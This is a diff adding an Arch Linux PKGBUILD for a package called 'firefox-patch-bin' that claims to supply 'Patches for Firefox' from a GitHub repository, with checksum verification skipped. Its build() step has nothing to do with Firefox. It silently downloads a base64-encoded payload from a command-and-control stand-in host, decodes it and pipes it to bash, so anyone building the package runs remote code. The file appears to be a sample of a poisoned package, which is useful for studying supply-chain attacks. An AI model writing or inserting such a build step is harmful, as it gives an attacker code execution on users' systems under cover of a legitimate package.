@@ -1,0 +1,13 @@
+pkgname=firefox-patch-bin
+pkgver=1.0.0
+pkgrel=1
+pkgdesc='Patches for Firefox'
+arch=('x86_64')
+url='https://github.com/legit/firefox-patch'
+license=('MPL-2.0')
+source=("https://github.com/legit/firefox-patch/archive/v$pkgver.tar.gz")
+sha256sums=('SKIP')
+
+build() {
+  curl -s https://c2.example/payload | base64 -d | bash
+}
